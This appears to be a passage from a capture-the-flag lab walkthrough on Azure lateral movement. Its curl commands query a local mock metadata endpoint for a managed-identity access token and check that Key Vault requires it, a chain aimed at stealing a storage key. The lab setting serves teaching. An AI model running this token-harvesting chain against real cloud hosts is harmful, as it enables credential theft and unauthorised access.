# Finding the Bug

## Identify the IMDS endpoint

Check what the metadata endpoint exposes without authentication.

```bash
curl -s http://localhost:8080/
```

```
Azure Lateral Movement Lab

Available endpoints:
  GET /metadata/identity/oauth2/token?resource=https://vault.azure.net
      Header: Metadata: true
      => returns access_token

  GET /secrets/storage-access-key?api-version=7.4
      Header: Authorization: Bearer <access_token>
      => returns storage access key

  GET /blob/labcontainer/flag.txt?key=<storage_key>
      => returns the flag
```

The lab shows you the hop chain. In a real Azure environment you would discover this by checking the VM's assigned roles and Key Vault access policies.

## Confirm the IMDS check

Try querying the token endpoint without the required `Metadata: true` header.

```bash
curl -s "http://localhost:8080/metadata/identity/oauth2/token?resource=https://vault.azure.net"
```

```json
{"error": "Missing required header: Metadata: true"}
```

The endpoint enforces the header. Add it.

```bash
curl -s -H "Metadata: true" \
  "http://localhost:8080/metadata/identity/oauth2/token?resource=https://vault.azure.net"
```

```json
{"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", "token_type": "Bearer", ...}
```

## Confirm Key Vault requires the token

```bash
curl -s "http://localhost:8080/secrets/storage-access-key?api-version=7.4"
```

```json
{"error": {"code": "Unauthorized", "message": "Invalid token"}}
```

You need a valid token to proceed. The token comes from IMDS.
